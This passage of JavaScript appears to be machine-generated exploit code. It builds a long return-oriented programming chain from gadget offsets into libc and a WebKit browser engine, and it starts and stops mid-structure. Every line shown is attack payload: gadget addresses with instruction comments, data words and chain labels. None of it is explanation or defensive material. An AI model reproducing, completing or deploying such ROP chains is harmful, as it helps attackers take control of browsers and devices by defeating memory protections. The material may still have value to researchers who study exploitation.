libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+109112, //L1134
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+109128, //L1135
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1134:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1135:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+109272, //L1139
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+109240, //L1137
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+109256, //L1138
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1137:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1138:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1139:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+109344, //L1141
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1141:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+109400, //L1142
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1142:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+109480, //L1146
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1146:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1144:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1145:
db([22, 0]); // 0x16
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+109584, //L1147
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+109600, //L1148
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1147:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1148:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+109688, //L1150
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1150:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+109744, //L1151
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1151:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+109816, //L1154
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1154:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+109872, //L1156
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1156:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L1157:
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+110008, //L1158
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1158:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1159:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+110112, //L1161
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+110128, //L1162
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1161:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1162:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+110272, //L1166
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+110240, //L1164
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+110256, //L1165
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1164:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1165:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1166:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+110344, //L1168
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1168:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+110400, //L1169
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1169:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+110480, //L1173
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1173:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1171:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1172:
db([23, 0]); // 0x17
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+110584, //L1174
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+110600, //L1175
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1174:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1175:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+110688, //L1177
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1177:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+110744, //L1178
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1178:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+110816, //L1181
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1181:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+110872, //L1183
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1183:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L1184:
libc_base+206806, //pop rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+111008, //L1185
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1185:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1186:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+111112, //L1188
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+111128, //L1189
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1188:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1189:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+111272, //L1193
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+111240, //L1191
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+111256, //L1192
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1191:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1192:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1193:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+111344, //L1195
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1195:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+111400, //L1196
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1196:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+111480, //L1200
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1200:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1198:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1199:
db([24, 0]); // 0x18
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+111584, //L1201
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+111600, //L1202
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1201:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1202:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+111688, //L1204
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1204:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+111744, //L1205
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1205:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+111816, //L1208
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1208:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+111872, //L1210
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1210:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+111960, //L1211
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1211:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1212:
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+112064, //L1214
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+112080, //L1215
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1214:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1215:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+112224, //L1219
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+112192, //L1217
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+112208, //L1218
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1217:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1218:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1219:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+112296, //L1221
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1221:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+112352, //L1222
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1222:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+112432, //L1226
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1226:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1224:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1225:
db([4, 0]); // 0x4
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+112536, //L1227
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+112552, //L1228
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1227:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1228:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877, //pop rsi
ropchain+112640, //L1230
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1230:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+112696, //L1231
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1231:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+112800, //L1233
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1233:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1234:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+112904, //L1236
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+112920, //L1237
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1236:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1237:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+113064, //L1241
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+113032, //L1239
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+113048, //L1240
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1239:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1240:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1241:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+113136, //L1243
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1243:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+113192, //L1244
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1244:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+113272, //L1248
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1248:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1246:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1247:
db([25, 0]); // 0x19
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+113376, //L1249
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+113392, //L1250
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1249:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1250:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+113480, //L1252
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1252:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+113536, //L1253
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1253:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+113608, //L1256
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1256:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+113664, //L1258
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1258:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L1259:
webkit_base+8975893, //mov [rdi + 0x10], r8
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+113800, //L1260
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1260:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1261:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+113904, //L1263
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+113920, //L1264
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1263:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1264:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+114064, //L1268
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+114032, //L1266
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+114048, //L1267
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1266:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1267:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1268:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+114136, //L1270
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1270:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+114192, //L1271
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1271:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+114272, //L1275
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1275:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1273:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1274:
db([26, 0]); // 0x1a
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+114376, //L1276
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+114392, //L1277
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1276:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1277:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+114480, //L1279
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1279:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+114536, //L1280
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1280:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+114608, //L1283
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1283:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+114664, //L1285
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1285:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L1286:
libc_base+206806, //pop rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+114800, //L1287
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1287:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1288:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+114904, //L1290
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+114920, //L1291
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1290:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1291:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+115064, //L1295
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+115032, //L1293
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+115048, //L1294
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1293:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1294:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1295:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+115136, //L1297
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1297:
db([0, 0]); // 0x0
set_gadgets([
